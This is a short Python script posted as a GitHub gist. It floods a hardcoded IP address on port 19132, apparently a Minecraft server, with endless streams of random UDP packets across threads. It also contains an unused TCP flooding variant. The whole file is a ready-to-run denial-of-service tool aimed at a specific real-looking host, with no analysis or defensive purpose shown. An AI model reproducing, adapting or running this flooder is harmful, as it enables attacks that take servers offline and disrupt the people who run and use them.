#date: 2021-12-10T16:58:48Z
#url: https://api.github.com/gists/40447668db05060e03993db89a322ade
#owner: https://api.github.com/users/JekoTC

#!/usr/bin/env python3
#Patched by HieuTrungMc
import random
import socket
import threading

print("--> Patched by JekoTC<--")
print("#-- cool stuff --#")
ip = '15.235.136.49'
port = 19132
choice = 'y'
times = 100000
threads = 2
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Sent!!!")
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Sent!!!")
		except:
			s.close()
			print("[*] Error")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()